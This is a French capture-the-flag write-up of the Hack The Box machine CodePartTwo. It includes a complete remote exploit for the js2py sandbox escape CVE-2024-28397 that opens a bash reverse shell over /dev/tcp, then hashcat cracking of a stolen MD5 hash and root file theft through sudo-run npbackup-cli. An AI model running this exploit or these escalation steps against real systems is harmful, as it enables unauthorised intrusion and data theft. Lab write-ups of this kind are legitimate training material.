# CodePartTwo
Linux


## Information Gathering


```bash
[Sep 14, 2025 - 14:55:09 (CEST)] exegol-ctf /workspace # nmap -sC -sV -T4 10.10.11.82                  
Starting Nmap 7.93 ( https://nmap.org ) at 2025-09-14 14:55 CEST  
Nmap scan report for 10.10.11.82  
Host is up (0.022s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 a047b40c6967933af9b45db32fbc9e23 (RSA)  
|   256 7d443ff1b1e2bb3d91d5da580f51e5ad (ECDSA)  
|_  256 f16b1d3618067a053f0757e1ef86b485 (ED25519)  
8000/tcp open  http    Gunicorn 20.0.4  
|_http-title: Welcome to CodePartTwo  
|_http-server-header: gunicorn/20.0.4  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 9.66 seconds
```

Le scan de port laisse présager une attaque orientée web, un seveur web
Gunicorn sur le port 8000

```bash
[Sep 14, 2025 - 15:47:44 (CEST)] exegol-ctf /workspace # cat gobuster-80.txt    
/dashboard            (Status: 302) [Size: 199] [--> /login]  
/download             (Status: 200) [Size: 10708]  
/login                (Status: 200) [Size: 667]  
/logout               (Status: 302) [Size: 189] [--> /]  
/register             (Status: 200) [Size: 651]
```
On note des enpoints peu contributifs après plusieurs test exepté download

![](Screenshot_20250914_150048.png)
Après avoir download l'app on explore le fichier app/app.py et

```python
js2py.disable_pyimport()  
app = Flask(__name__)  
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
```

Le requirement.txt donne une idée du backend

```bash
─tximista at zaworudo in ~/Téléchargements/app 25-09-14 - 16:53:59  
╰─○ cat requirements.txt     
flask==3.0.3  
flask-sqlalchemy==3.1.1  
js2py==0.74
```

On va tenter de forger un cookie flask

```bash
(venv) ╭─tximista at zaworudo in ~/Tools 25-09-14 - 15:38:08  
╰─(venv) ○ flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InR4aW1pIn0.aMbH4Q.04HOk6NfnYLBgRavU0Ta-FVGt3I'                       
{'user_id': 5, 'username': 'tximi'}  
(venv) ╭─tximista at zaworudo in ~/Tools 25-09-14 - 15:49:53


(venv) ╭─tximista at zaworudo in ~/Tools 25-09-14 - 15:52:52  
╰─(venv) ○ flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6ImFkbWluIn0.aMbLtA.p5vZkOLnaRoSVyODjjFtjrZ_eMU'  
{'user_id': 3, 'username': 'admin'}   
(venv) ╭─tximista at zaworudo in ~/Tools 25-09-14 - 16:08:31  
╰─(venv) ○ flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6ImRldiJ9.aMbMcw.JRjZRgvspJIAQXB5FZalh7Pk_gs'      
{'user_id': 4, 'username': 'dev'}



```

Impossible a forger un cookie avec divers users et divers user_id c'estune fausse piste. Je cherche desormais des CVE dispo sur les items mentionnés.

Je trouve un  Poc de la  CVE-2024-28397 trouvé par un hacker chinois et affectant js2py permettant d'évader des commandes python hors d'unesandbox via javascript 
[http://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py]()

En explorant app.py on note

```python
@app.route('/run_code', methods=['POST'])  
def run_code():  
   try:  
       code = request.json.get('code')  
       result = js2py.eval_js(code)  
       return jsonify({'result': result})  
   except Exception as e:  
       return jsonify({'error': str(e)})
       ```


L'app attend un json en POST comprenant le code  js2py.eval_js() évaluele code js côté Python, jsonify() renvoi un JSON de la réponse soit {'result;'} soit {'error':}

Même si la fonction `disable_pyimport()` est censée désactiver l’importation de modules Python depuis le code JavaScript, cette app peut être contournée viaJavaScript en accédant à la chaîne d'attribut Python car le code JS peut  être  passé à `js2py.eval_js()` côté serveur, et donneaccès à la machine via `child_process`

Il va faloir modifier le poc.py de la cve il est consu pour être utilisé en local

## Exploitation  et Foothold

L'exploit modifié trouvable en direct download ici
https://github.com/tximista64/Code4Tool/blob/main/Web/cve-2024-28397-remote.py

```python 
#!/usr/bin/env python3  
  
import requests  
import json  
import argparse  
  
parser = argparse.ArgumentParser(description="CVE-2024-28397 - Remotely  
")  
parser.add_argument("--url", required=True, help="URL cible, ex: http:/  
/10.10.11.82:8000/run_code")  
parser.add_argument("--lhost", required=True, help="Adresse IP locale")  
parser.add_argument("--lport", required=True, help="Port local")  
args = parser.parse_args()  
  
payload = f"""  
let cmd = "bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'  
"; //modifié stdout ignoré si pas de shell  
let hacked, bymarve, n11  
let getattr, obj  
  
hacked = Object.getOwnPropertyNames({{}});  
bymarve = hacked.__getattribute__;  
n11 = bymarve("__getattribute__");  
obj = n11("__class__").__base__;  
getattr = obj.__getattribute__;  
  
function findpopen(o) {{  
   let result;  
   for(let i in o.__subclasses__()) {{  
       let item = o.__subclasses__()[i];  
       if(item.__module__ == "subprocess" && item.__name__ == "Popen")  
{{  
           if(item.__name__ != "type" && (result = findpopen(item))) {  
{  
               return result;  
           }}  
           return item;  
       }}  
   }}  
}}  
  
// Exécution du reverse shell via subprocess.Popen  
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true  
).communicate();  
console.log(result);  
result;  
"""  
  
# Préparation de la requête HTTP  
code = { "code": payload }  
headers = { "Content-Type": "application/json" }  
  
# Envoi du payload  
print(f"[+] Envoi du payload vers {args.url}")  
print(f"[+] Reverse shell sur {args.lhost}:{args.lport}")  
print("[!] Keep calm & privesc...")  
response = requests.post(args.url, data=json.dumps(code), headers=heade  
rs)
```
On lance le reverse shell et un listener via pwncat-cs

```bash
─tximista at zaworudo in ~/Téléchargements 25-09-14 - 22:57:14
╰─○ ./cve-2024-28397-remote.py --url http://10.10.11.82:8000/run_code -  
-lhost 10.10.14.89 --lport 1337  
[+] Envoi du payload vers http://10.10.11.82:8000/run_code  
[+] Reverse shell sur 10.10.14.89:1337  
[!] Keep calm & privesc...
[Sep 14, 2025 - 22:57:26 (CEST)] exegol-ctf /workspace # pwncat-cs -lp 1337                                                       
[22:57:33] Welcome to pwncat 🐈!                                                                                                  __main__.py:164
[22:57:45] received connection from 10.10.11.82:50270                                                                                  bind.py:84
[22:57:47] 10.10.11.82:50270: registered new host w/ db                                                                            manager.py:957
(local) pwncat$ back
(remote) app@codeparttwo:/home/app/app$ ls
app.py  instance  __pycache__  requirements.txt  static  templates
(remote) app@codeparttwo:/home/app/app$ 
```

On retrouve un user.db et un hash

```bash

(remote) app@codeparttwo:/home/app/app/instance$ sqlite3 users.db    
SQLite version 3.31.1 2020-01-27 19:55:54  
Enter ".help" for usage hints.  
sqlite> .tables  
code_snippet  user           
sqlite> SELECT * FROM user;  
1|marco|649c9d65a206a75f5abe509fe128bce5  
2|app|a97588c0e2fa3a024876339e27aeb42e  
[Sep 14, 2025 - 23:07:34 (CEST)] exegol-ctf /workspace # haiti 649c9d65a206a75f5abe509fe128bce5  
MD5 [HC: 0] [JtR: raw-md5]
LM [HC: 3000] [JtR: lm]
NTLM [HC: 1000] [JtR: nt]
Domain Cached Credentials (DCC), MS Cache [HC: 1100] [JtR: mscash]
Domain Cached Credentials 2 (DCC2), MS Cache 2 [HC: 2100] [JtR: mscash2]
MD2 [JtR: md2]
MD4 [HC: 900] [JtR: raw-md4]
Haval-128 (4 rounds) [JtR: haval-128-4]
Lotus Notes/Domino 5 [HC: 8600] [JtR: lotus5]
Skype [HC: 23]
IPB 2.x (Invision Power Board) [HC: 2811]
Keyed MD5: RIPv2, OSPF, BGP, SNMPv2 [JtR: net-md5]
RIPEMD-128 [JtR: ripemd-128]
Snefru-128 [JtR: snefru-128]
IPMI 2.0 RAKP HMAC-MD5 [HC: 7350]
DNSSEC (NSEC3) [HC: 8300]
RAdmin v2.x [HC: 9900] [JtR: radmin]
Umbraco HMAC-SHA1 [HC: 24800]
Bitcoin WIF private key (P2PKH), compressed [HC: 28501]
Bitcoin WIF private key (P2PKH), uncompressed [HC: 28502]
WPA-EAPOL-PBKDF2 [HC: 2500]
WPA-EAPOL-PMK [HC: 2501]
[Sep 14, 2025 - 23:07:43 (CEST)] exegol-ctf /workspace # echo '649c9d65a206a75f5abe509fe128bce5' > hash.txt
[Sep 14, 2025 - 23:08:26 (CEST)] exegol-ctf /workspace # hashcat --hash-type 0 --attack-mode 0 hash.txt /opt/lists/rockyou.txt
SNIP
Dictionary cache built:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove   

(remote) app@codeparttwo:/home/app/app/instance$ su marco  
Password:    
marco@codeparttwo:/home/app/app/instance$ cd  
marco@codeparttwo:~$ cat user.txt    
b7de2fae492eb8660bf2601b68929e09  

Une fois le hash décodé on peux compromettre un nouvel user nomé marco.

```

## Privesc 
On trouve un fichier de conf d'un programme qui comme par hasard 
peux être executé en tant que root via sudo
```bash

marco@codeparttwo:~$ cat npbackup.conf    
conf_version: 3.0.1  
audience: public  
repos:  
 default:  
   repo_uri:    
     __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpD  
U+e+E__NPBACKUP__  
   repo_group: default_group  
   backup_opts:  
     paths:  
     - /home/app/app/  
     source_type: folder_list  
     exclude_files_larger_than: 0.0  
   repo_opts:  
     repo_password:    
       __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPB  
ACKUP__  
 SNIP 
marco@codeparttwo:~$ sudo -l  
Matching Defaults entries for marco on codeparttwo:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User marco may run the following commands on codeparttwo:  
   (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli 
marco@codeparttwo:~$ cp npbackup.conf /tmp/rootssh.conf  
```

On change le path par /root/
```bash 
marco@codeparttwo:~$ cp npbackup.conf /tmp/rootssh.conf  
marco@codeparttwo:~$ vim /tmp/rootssh.conf  
```

  On tente de comprendre comment le programme fonctionne
```bash
marco@codeparttwo:~$ npbackup-cli --help  
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group 

SNIP SNIP

optional arguments:  
 -h, --help            show this help message and exit  

 SNIP SNIP
 -b, --backup          Run a backup  
 -f, --force           Force running a backup regardless of existing backups age  
 -r RESTORE, --restore RESTORE  
                       Restore to path given by --restore, add --snapshot-id to specify a snapshot other than latest  
 -s, --snapshots       Show current snapshots  
 --ls [LS]             Show content given snapshot. When no snapshot id is given,  

SNIP SNIP SNIP  

 --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump [file], add --snapshot-id to specify a  
                       snapshot other than latest
```

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/rootssh.conf --backup --force  
2025-09-14 21:58:27,938 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent r  
unning as root  
2025-09-14 21:58:27,970 :: INFO :: Loaded config 09F15BEC in /tmp/rootssh.conf  
2025-09-14 21:58:27,982 :: INFO :: Running backup of ['/root/'] to repo default  
2025-09-14 21:58:29,100 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions  
2025-09-14 21:58:29,101 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found  
2025-09-14 21:58:29,101 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes  
2025-09-14 21:58:29,101 :: ERROR :: Exclude file 'excludes/generic_excludes' not found  
2025-09-14 21:58:29,101 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes  
2025-09-14 21:58:29,101 :: ERROR :: Exclude file 'excludes/windows_excludes' not found  
2025-09-14 21:58:29,101 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes  
2025-09-14 21:58:29,101 :: ERROR :: Exclude file 'excludes/linux_excludes' not found  
2025-09-14 21:58:29,101 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows  
no parent snapshot found, will read all files  
  
Files:          15 new,     0 changed,     0 unmodified  
Dirs:            8 new,     0 changed,     0 unmodified  
Added to the repository: 190.612 KiB (39.886 KiB stored)  
  
processed 15 files, 197.660 KiB in 0:00  
snapshot eb6e5b08 saved  
2025-09-14 21:58:30,233 :: INFO :: Backend finished with success  
2025-09-14 21:58:30,236 :: INFO :: Processed 197.7 KiB of data  
2025-09-14 21:58:30,236 :: ERROR :: Backup is smaller than configured minmium backup size  
2025-09-14 21:58:30,236 :: ERROR :: Operation finished with failure  
2025-09-14 21:58:30,236 :: INFO :: Runner took 2.255908 seconds for backup  
2025-09-14 21:58:30,236 :: INFO :: Operation finished  
2025-09-14 21:58:30,243 :: INFO :: ExecTime = 0:00:02.307656, finished, state is: errors.  
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/rootssh.conf --ls  
2025-09-14 21:58:46,009 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent r  
unning as root  
2025-09-14 21:58:46,037 :: INFO :: Loaded config 09F15BEC in /tmp/rootssh.conf  
2025-09-14 21:58:46,047 :: INFO :: Showing content of snapshot latest in repo default  
2025-09-14 21:58:48,185 :: INFO :: Successfully listed snapshot latest content:  
snapshot eb6e5b08 of [/root] at 2025-09-14 21:58:29.110455922 +0000 UTC by root@codeparttwo filtered by []:  
/root  
/root/.bash_history  
/root/.bashrc  
/root/.cache  
/root/.cache/motd.legal-displayed  
/root/.local  
/root/.local/share  
/root/.local/share/nano  
/root/.local/share/nano/search_history  
/root/.mysql_history  
/root/.profile  
/root/.python_history  
/root/.sqlite_history  
/root/.ssh  
/root/.ssh/authorized_keys  
/root/.ssh/id_rsa  
/root/.vim  
/root/.vim/.netrwhist  
/root/root.txt  
/root/scripts  
/root/scripts/backup.tar.gz  
/root/scripts/cleanup.sh  
/root/scripts/cleanup_conf.sh  
/root/scripts/cleanup_db.sh  
/root/scripts/cleanup_marco.sh  
/root/scripts/npbackup.conf  
/root/scripts/users.db  
  
2025-09-14 21:58:48,185 :: INFO :: Runner took 2.138347 seconds for ls  
2025-09-14 21:58:48,186 :: INFO :: Operation finished  
2025-09-14 21:58:48,192 :: INFO :: ExecTime = 0:00:02.185295, finished, state is: success.  
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/rootssh.conf --dump /root/root.txt  
3f2befade952a0daa6aa35dfc2d03e84
```
On peux dump quelconque fichier du back up via le programme.
#offensive #HTB #privilege_escalation #sqlite #hashcat #CVE-2024-28397 #js2py
